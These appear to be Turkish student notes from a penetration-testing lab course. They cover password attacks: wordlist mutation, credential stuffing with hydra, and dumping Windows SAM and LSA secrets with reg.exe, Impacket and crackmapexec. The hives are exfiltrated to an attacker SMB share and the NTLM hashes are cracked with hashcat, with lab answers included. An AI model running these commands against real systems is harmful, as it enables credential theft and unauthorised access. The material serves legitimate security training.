`Hashcat` ve `John`, parola oluşturma ve kırma amaçlarımız için kullanabileceğimiz önceden oluşturulmuş kural listeleriyle birlikte gelir. En çok kullanılan kurallardan biri `best64.rule` olup, genellikle iyi sonuçlara yol açabilir. Parola kırma ve özel kelime listeleri oluşturmanın çoğu durumda bir tahmin oyunu olduğunu unutmamak önemlidir. Parola politikası hakkında bilgi sahibi olursak ve şirket adını, coğrafi bölgeyi, sektörü ve kullanıcıların parolalarını oluşturmak için seçebilecekleri diğer konuları/kelimeleri dikkate alırsak, bunu daraltabilir ve daha hedefli tahminler gerçekleştirebiliriz. Elbette şifrelerin sızdırıldığı ve bulunduğu durumlar istisnadır.


#### **Hashcat Mevcut Kurallar**

```shell-session
M1R4CKCK@htb[/htb]$ ls /usr/share/hashcat/rules/

best64.rule                  specific.rule
combinator.rule              T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
d3ad0ne.rule                 T0XlC-insert_space_and_special_0_F.rule
dive.rule                    T0XlC-insert_top_100_passwords_1_G.rule
generated2.rule              T0XlC.rule
generated.rule               T0XlCv1.rule
hybrid                       toggles1.rule
Incisive-leetspeak.rule      toggles2.rule
InsidePro-HashManager.rule   toggles3.rule
InsidePro-PasswordsPro.rule  toggles4.rule
leetspeak.rule               toggles5.rule
oscommerce.rule              unix-ninja-leetspeak.rule
rockyou-30000.rule
```

Şimdi [CeWL](https://github.com/digininja/CeWL) adlı başka bir aracı kullanarak şirketin web sitesindeki potansiyel kelimeleri tarayabilir ve bunları ayrı bir listeye kaydedebiliriz. Daha sonra bu listeyi istenen kurallarla birleştirebilir ve doğru şifreyi tahmin etme olasılığı daha yüksek olan özelleştirilmiş bir şifre listesi oluşturabiliriz. Örümcek derinliği (`-d`), kelimenin minimum uzunluğu (`-m`), bulunan kelimelerin küçük harfle saklanması (`--lowercase`) ve sonuçları saklamak istediğimiz dosya (`-w`) gibi bazı parametreler belirliyoruz.

#### **CeWL Kullanarak Sözcük Listeleri Oluşturma**

```shell-session
M1R4CKCK@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
M1R4CKCK@htb[/htb]$ wc -l inlane.wordlist

326
```


Soru : Bu bölümün sağ üst köşesindeki “Kaynaklar” altında bulunan ZIP dosyasındaki dosyaları kullanarak mutasyona uğramış bir kelime listesi oluşturun. Bu kelime listesini "sam" kullanıcısının şifresini brute force yapmak için kullanın. Başarılı olduğunuzda, SSH ile oturum açın ve flag.txt dosyasının içeriğini yanıtınız olarak gönderin.

Cevap : 

![Pasted image 20241102015906.png](/img/user/resimler/Pasted%20image%2020241102015906.png)
ssh portuna brute force yapamıyoruz.  ftp'ye yap 



# **Parolanın Yeniden Kullanımı / Varsayılan Parolalar**

Hem kullanıcıların hem de yöneticilerin varsayılanları yerinde bırakması yaygın bir durumdur. Yöneticiler, erişilen verilerle birlikte tüm teknoloji, altyapı ve uygulamaları takip etmek zorundadır. Bu durumda, `aynı parola` genellikle yapılandırma amacıyla kullanılır ve daha sonra parolanın bir arayüz veya başka bir arayüz için değiştirilmesi unutulur. Buna ek olarak, kimlik doğrulama mekanizmalarıyla çalışan birçok uygulama, temelde neredeyse hepsi, kurulumdan sonra genellikle `varsayılan kimlik bilgileriyle` birlikte gelir. Bu varsayılan kimlik bilgileri, özellikle yöneticilerin başka kimsenin bulamayacağını varsaydığı ve kullanmaya bile çalışmadığı dahili uygulamalar söz konusu olduğunda, yapılandırma sonrasında değiştirilmesi unutulabilir.  

Ayrıca, 15 karakterlik uzun şifreler yazmak yerine hızlıca yazılabilen, hatırlaması kolay şifreler, ilk kurulum sırasında [Tek Oturum Açma](https://en.wikipedia.org/wiki/Single_sign-on) (`SSO`) her zaman hemen kullanılamadığı ve dahili ağlarda yapılandırma önemli değişiklikler gerektirdiği için sıklıkla tekrar tekrar kullanılır. Ağları yapılandırırken, bazen yüzlerce arayüze sahip olabilen geniş altyapılarla (şirketin büyüklüğüne bağlı olarak) çalışırız. Genellikle yönlendirici, yazıcı veya güvenlik duvarı gibi bir ağ cihazı gözden kaçar ve `varsayılan kimlik bilgileri` kullanılır veya aynı `parola tekrar` kullanılır .

## **Kimlik Bilgileri Doldurma**  

Bilinen varsayılan kimlik bilgilerinin çalışan bir listesini tutan çeşitli veritabanları vardır. Bunlardan biri [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet). İşte bu hile sayfasının tüm tablosundan küçük bir alıntı:

![Pasted image 20241102135029.png](/img/user/resimler/Pasted%20image%2020241102135029.png)

Varsayılan kimlik bilgileri, hizmeti başarılı bir şekilde kurmak için gerekli adımları içerdiğinden ürün belgelerinde de bulunabilir. Bazı cihazlar/uygulamalar kullanıcının kurulum sırasında bir parola belirlemesini gerektirir, ancak diğerleri varsayılan, zayıf bir parola kullanır. Bu hizmetlere varsayılan veya elde edilen kimlik bilgileriyle saldırmaya [Credential Stuffing](https://owasp.org/www-community/attacks/Credential_stuffing) denir. Bu, Brute Forcing'in basitleştirilmiş bir çeşididir çünkü yalnızca bileşik kullanıcı adları ve ilişkili parolalar kullanılır.  

Ağda müşterilerimiz tarafından kullanılan bazı uygulamalar bulduğumuzu hayal edebiliriz. Varsayılan kimlik bilgileri için internette arama yaptıktan sonra, bu bileşik kimlik bilgilerini iki nokta üst üste ile ayıran yeni bir liste oluşturabiliriz (`kullanıcı adı:parola`). Ek olarak, şifreleri seçebilir ve isabet olasılığını artırmak için `kurallarımız` tarafından mutasyona uğratabiliriz.


#### **Kimlik Bilgisi Doldurma - Hydra Syntax**

```shell-session
M1R4CKCK@htb[/htb]$ hydra -C <user_pass.list> <protocol>://<IP>
```


#### Credential Stuffing - Hydra

```shell-session
M1R4CKCK@htb[/htb]$ hydra -C user_pass.list ssh://10.129.42.197

...
```

Burada OSINT bir başka önemli rol daha oynamaktadır. OSINT bize şirketin ve altyapısının nasıl yapılandırıldığına dair bir “his” verdiğinden, hangi şifreleri ve kullanıcı adlarını birleştirebileceğimizi anlayacağız. Daha sonra bunları listelerimizde saklayabilir ve daha sonra kullanabiliriz. Buna ek olarak, bulduğumuz uygulamaların kullanılabilecek kodlanmış kimlik bilgilerine sahip olup olmadığını görmek için Google'ı kullanabiliriz.


#### Google Search - Default Credentials
![Pasted image 20241102135351.png](/img/user/resimler/Pasted%20image%2020241102135351.png)

Uygulamalar için varsayılan kimlik bilgilerinin yanı sıra, bazı listeler bunları yönlendiriciler için sunar. Bu listelerden birini [burada](https://www.softwaretestinghelp.com/default-router-username-and-password-list/) bulabilirsiniz. Yönlendiriciler için varsayılan kimlik bilgilerinin değiştirilmeden bırakılması çok daha az olasıdır. Bunlar ağlar için merkezi arayüzler olduğundan, yöneticiler genellikle bunları güçlendirmeye çok daha fazla önem verirler. Bununla birlikte, bir yönlendiricinin gözden kaçmış olması veya şu anda yalnızca test amacıyla iç ağda kullanılıyor olması ve daha sonra başka saldırılar için istismar edebilmemiz hala mümkündür.

![Pasted image 20241102135457.png](/img/user/resimler/Pasted%20image%2020241102135457.png)



Soru : Önceki bölümde bulduğumuz kullanıcı kimlik bilgilerini kullanın ve MySQL için kimlik bilgilerini bulun. Kimlik bilgilerini cevap olarak gönderin. (Format: <kullanıcı adı>:<şifre>)

Cevap  : 

![Pasted image 20241102135944.png](/img/user/resimler/Pasted%20image%2020241102135944.png)

https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv

Varsayılan kimlik bilgileri  : 

![Pasted image 20241102140714.png](/img/user/resimler/Pasted%20image%2020241102140714.png)

superdba:admin

![Pasted image 20241102140818.png](/img/user/resimler/Pasted%20image%2020241102140818.png)


### Attacking SAM
Domain'e bağlı olmayan bir Windows sistemine erişimle, SAM veritabanıyla ilişkili dosyaları saldırı hostumuza aktarmak ve hash'leri çevrimdışı kırmaya başlamak için hızlı bir şekilde dump etmeye çalışmaktan faydalanabiliriz. Bunu çevrimdışı yapmak, bir hedefle aktif bir oturum sürdürmeden saldırılarımızı denemeye devam edebilmemizi sağlayacaktır. 


#### **SAM Registry Kovanlarını Kopyalama**  

Hedefte lokal yönetici erişimimiz varsa kopyalayabileceğimiz üç kayıt defteri kovanı vardır; hash'leri döküp kırmaya başladığımızda her birinin belirli bir amacı olacaktır. Aşağıdaki tabloda her birinin kısa bir açıklaması bulunmaktadır:

![Pasted image 20241102142929.png](/img/user/resimler/Pasted%20image%2020241102142929.png)

`Reg.exe` yardımcı programını kullanarak bu kovanların yedeklerini oluşturabiliriz.


#### **Kayıt Defteri Kovanlarını Kopyalamak için reg.exe save dosyasını kullanma**  

CMD'yi yönetici olarak başlatmak, yukarıda bahsedilen registry kovanlarının kopyalarını kaydetmek için reg.exe'yi çalıştırmamıza izin verecektir. Bunu yapmak için aşağıdaki komutları çalıştırın:

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

Teknik olarak yalnızca `hklm\sam` ve `hklm\system`'e ihtiyacımız olacak, ancak `hklm\security`, domain'e bağlı hostlarda bulunan cached domain kullanıcı hesabı kimlik bilgileriyle ilişkili hash'leri içerebileceğinden kaydetmek için de yararlı olabilir. Kovanlar çevrimdışı olarak kaydedildikten sonra, bunları saldırı hostumuza aktarmak için çeşitli yöntemler kullanabiliriz. Bu durumda, kovan kopyalarını saldırı hostumuzda oluşturulan bir paylaşıma taşımak için bazı yararlı CMD komutlarıyla birlikte [Impacket'in smbserver.py](“https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py”) dosyasını kullanalım.

#### **smbserver.py ile Paylaşım Oluşturma**  

Paylaşımı oluşturmak için tek yapmamız gereken python kullanarak smbserver.py -smb2support dosyasını çalıştırmak, paylaşıma bir isim vermek (`CompData`) ve paylaşımın kovan kopyalarını depolayacağı saldırı hostumuzdaki dizini belirtmek (`/home/ltnbob/Documents`). `smb2support` seçeneğinin SMB'nin daha yeni sürümlerinin desteklenmesini sağlayacağını bilin. Bu bayrağı kullanmazsak, Windows hedefinden saldırı hostumuzda barındırılan paylaşıma bağlanırken hatalar olacaktır. Windows'un yeni sürümleri, [çok sayıda ciddi güvenlik açığı](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1) ve halka açık istismarlar nedeniyle varsayılan olarak SMBv1'i desteklemez.

```shell-session
M1R4CKCK@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

- **`-smb2support`**: Bu seçenek, SMBv2 protokolü desteğini etkinleştirir. SMBv2, daha yeni bir protokoldür ve birçok modern işletim sistemi tarafından kullanılır. Bu bayrağın eklenmesi, SMBv2 protokolüyle bağlantı yapılmasına olanak tanır.
    
- **`CompData`**: Bu, paylaşımın SMB üzerinde görüleceği isimdir. Ağ üzerinden bu SMB sunucusuna bağlanırken, `CompData` adıyla görülecektir. Örneğin, bir Windows istemcisi bu paylaşımı `\\sunucu_IP_adresi\CompData` şeklinde görecektir.
    
- **`/home/ltnbob/Documents/`**: Bu parametre, paylaşılacak dizinin tam yolunu belirtir. Bu durumda, `CompData` adlı SMB paylaşımı, `/home/ltnbob/Documents/` dizinini temsil eder. Yani, SMB sunucusuna bağlanan bir kullanıcı, bu klasördeki dosyalara erişebilir.


Saldırı hostumuzda paylaşımı çalıştırdıktan sonra, kovan kopyalarını paylaşıma taşımak için Windows hedefinde `move` komutunu kullanabiliriz.


#### **Kovan Kopyalarını Paylaşıma Taşıma**

```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

Ardından, saldırı hostumuzdaki paylaşılan dizine giderek ve dosyaları listelemek için `ls` kullanarak kovan kopyalarımızın paylaşıma başarıyla taşındığını doğrulayabiliriz.

#### **Saldırı Hostuna Aktarılan Kovan Kopyalarını Doğrulama**

```shell-session
M1R4CKCK@htb[/htb]$ ls

sam.save  security.save  system.save
```


## **Impacket'in secretsdump.py ile Hash'leri Dump Etme**
Hash'leri çevrimdışı olarak dump etmek için kullanabileceğimiz inanılmaz derecede kullanışlı bir araç Impacket'in `secretsdump.py`'sidir. Impacket çoğu modern sızma testi dağıtımında bulunabilir. Linux tabanlı bir sistemde `locate` kullanarak kontrol edebiliriz:


#### Locating secretsdump.py
secretsdump.py'yi kullanmak basit bir işlemdir. Tek yapmamız gereken, Python kullanarak secretsdump.py dosyasını çalıştırmak ve ardından hedef hosttan aldığımız her bir hive dosyasını belirtmek.

#### Running secretsdump.py
```shell-session
M1R4CKCK@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM 
 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
```

Burada secretsdump'ın `lokal` SAM hash'lerini başarılı bir şekilde döktüğünü ve hedef domain'e bağlıysa ve hklm\security'de cached kimlik bilgileri mevcutsa cached domain logon bilgilerini de dökeceğini görüyoruz. secretsdump'ın yürüttüğü ilk adımın, `LOCAL SAM hash'`lerini dump etmeye geçmeden önce `system bootkey` 'i hedeflediğine dikkat edin. Önyükleme anahtarı olmadan bu hash'leri dump edemez çünkü boot anahtarı SAM veritabanını şifrelemek ve şifresini çözmek için kullanılır, bu yüzden bu bölümde daha önce bahsettiğimiz registry kovanlarının kopyalarına sahip olmamız bizim için önemlidir. secretsdump.py çıktısının üst kısmına dikkat edin:

```shell-session
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

Bu bize çıktıyı nasıl okuyacağımızı ve hangi hash'leri kırabileceğimizi söyler. Çoğu modern Windows işletim sistemi parolayı NT hash olarak saklar. Windows Vista ve Windows Server 2008'den daha eski işletim sistemleri parolaları LM hash olarak saklar, bu nedenle hedefimiz daha eski bir Windows işletim sistemi ise bunları kırmaktan yalnızca fayda sağlayabiliriz.
Bunu bilerek, her kullanıcı hesabıyla ilişkili NT hash'lerini bir metin dosyasına kopyalayabilir ve şifreleri kırmaya başlayabiliriz. Hangi şifrenin hangi kullanıcı hesabıyla ilişkili olduğunu bilmemiz için her kullanıcıyı not etmek faydalı olabilir.


## **Hashcat ile Hash'leri Kırma**  

[Hash](“https://hashcat.net/hashcat/”)'leri elde ettikten sonra, [Hashcat](“https://hashcat.net/hashcat/”) kullanarak bunları kırmaya başlayabiliriz. Topladığımız hashleri kırmaya çalışmak için kullanacağız. Hashcat web sitesine bir göz atarsak, çok çeşitli hash algoritmaları için destek olduğunu fark edeceğiz. Bu modülde, Hashcat'i belirli kullanım durumları için kullanacağız. Bu, Hashcat'i kullanma zihniyetini ve anlayışını geliştirmemize ve yakaladığımız hash'lere bağlı olarak hangi modu ve seçenekleri kullanmamız gerektiğini anlamak için Hashcat'in belgelerine ne zaman başvurmamız gerektiğini bilmemize yardımcı olacaktır.  

Daha önce de belirtildiği gibi, bir metin dosyasını dökebildiğimiz NT hash'leri ile doldurabiliriz.


#### **Bir .txt Dosyasına nthashes Ekleme**

```shell-session
M1R4CKCK@htb[/htb]$ sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

Artık NT`hash`'leri metin dosyamızda (`hashestocrack.txt`) olduğuna göre, bunları kırmak için Hashcat'i kullanabiliriz.

#### **Hashcat'i NT Hash'lerine karşı çalıştırma**  

Hashcat'in kullanabileceğimiz birçok farklı modu vardır. Bir mod seçmek büyük ölçüde saldırı türüne ve kırmak istediğimiz hash türüne bağlıdır. Her bir modu ele almak bu modülün kapsamı dışındadır. NT hash'lerimizi (NTLM tabanlı hash'ler olarak da adlandırılır) kırmak için `1000` hash türünü seçmek üzere `-m` kullanmaya odaklanacağız `.` Desteklenen hash türlerini ve ilgili numaralarını görmek için Hashcat'in [wiki sayfasına](https://hashcat.net/wiki/doku.php?id=example_hashes) veya man sayfasına başvurabiliriz. Bu modülün `Kimlik Bilgileri Depolama` bölümünde bahsedilen meşhur rockyou.txt kelime listesini kullanacağız.

```shell-session
M1R4CKCK@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: dumpedhashes.txt
Time.Started.....: Tue Dec 14 14:16:56 2021 (0 secs)
Time.Estimated...: Tue Dec 14 14:16:56 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 5/5 (100.00%) Digests
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: newzealand -> whitetiger

Started: Tue Dec 14 14:16:50 2021
Stopped: Tue Dec 14 14:16:58 2021
```

Çıktıdan, Hashcat'in bilinen şifrelerin bir listesini (rockyou.txt) kullanarak şifreleri hızlı bir şekilde tahmin etmek için [sözlük saldırısı](https://en.wikipedia.org/wiki/Dictionary_attack) adı verilen bir saldırı türü kullandığını ve hashlerin 3'ünü kırmada başarılı olduğunu görebiliriz. Şifrelere sahip olmak bizim için pek çok açıdan faydalı olabilir. Ağdaki diğer sistemlere erişmek için kırdığımız şifreleri kullanmayı deneyebiliriz. İnsanların farklı iş ve kişisel hesaplarında şifreleri yeniden kullanması çok yaygındır. Ele aldığımız bu tekniği bilmek görevlerde faydalı olabilir. Savunmasız bir Windows sistemiyle karşılaştığımızda ve SAM veritabanını boşaltmak için yönetici hakları kazandığımızda bunu kullanmaktan fayda sağlayacağız.  

Bunun iyi bilinen bir teknik olduğunu unutmayın, bu nedenle yöneticilerin bunu önlemek ve tespit etmek için önlemleri olabilir. Bu yöntemlerden bazılarını MITRE saldırı çerçevesi içinde [belgelenmiş](https://attack.mitre.org/techniques/T1003/002/) olarak görebiliriz


## **Remote Dumping & LSA Secrets Dikkat Edilmesi Gerekenler**  

`Lokal admin ayrıcalıklarına` sahip kimlik bilgilerine erişim sayesinde, ağ üzerinden LSA gizli dizilerini hedef almamız da mümkündür. Bu, parolaları depolamak için LSA gizli dizilerini kullanan çalışan bir hizmetten, zamanlanmış görevden veya uygulamadan kimlik bilgilerini çıkarmamıza olanak sağlayabilir.


#### **Dumping LSA Secrets Remotely**
```shell-session
M1R4CKCK@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
```


#### **Dumping SAM Remotely**

SAM veritabanından hash'leri uzaktan da dökebiliriz.

```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
```

Zorlu soruları tamamlamak için çalışırken bu bölümde öğretilen her tekniği uygulayın.


Soru : SAM veritabanı Windows kayıt defterinde nerede bulunur? 
Cevap : hklm\sam

Soru : Hedefteki ITbackdoor kullanıcı hesabının parolasını elde etmek için bu bölümde öğretilen kavramları uygulayın. Açık metin parolasını cevap olarak gönderin.
Cevap : 

1-Windows bilgisayara rdp ile bağlanıp . Kovanları alalım

![Pasted image 20241102173241.png](/img/user/resimler/Pasted%20image%2020241102173241.png)


![Pasted image 20241102173205.png](/img/user/resimler/Pasted%20image%2020241102173205.png)

2- Ardından smb suncusundan aktaralım . 

![Pasted image 20241102173322.png](/img/user/resimler/Pasted%20image%2020241102173322.png)

![Pasted image 20241102174009.png](/img/user/resimler/Pasted%20image%2020241102174009.png)


![Pasted image 20241102174206.png](/img/user/resimler/Pasted%20image%2020241102174206.png)



```shell-session
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
[*] NL$KM 
 0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
 0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
 0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
 0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
[*] _SC_gupdate 
(Unknown User):Password123
[*] Cleaning up... 
```


### 1. **Kullanıcı Hash'leri**:

- **Administrator**:
    - `uid:rid:lmhash:nthash`
    - `500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`
- **Guest**:
    - `501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`
- **DefaultAccount**:
    - `503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`
- **WDAGUtilityAccount**:
    - `504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::`
- **bob**:
    - `1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::`
- **jason**:
    - `1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::`
- **ITbackdoor**:
    - `1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::`
- **frontdesk**:
    - `1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::`

### 2. **Önbelleğe Alınmış Alan Giriş Bilgileri**:

- Bu bölümde herhangi bir bilgi bulunmamaktadır.

### 3. **LSA Gizli Bilgileri**:

- **DPAPI Sistem Anahtarı**:
    - `dpapi_machinekey`: `0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce`
    - `dpapi_userkey`: `0x50b9fa0fd79452150111357308748f7ca101944a`
- **NL$KM**:
    - `NL$KM`:
        - `e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b`

### 4. **Diğer Gizli Bilgiler**:

- **_SC_gupdate**:
    - `(Unknown User)`: `Password123`

Bu değerleri kullanarak çeşitli sızma testleri gerçekleştirebilir veya şifreleri kırmayı deneyebilirsiniz.


![Pasted image 20241102175139.png](/img/user/resimler/Pasted%20image%2020241102175139.png)

![Pasted image 20241102175149.png](/img/user/resimler/Pasted%20image%2020241102175149.png)



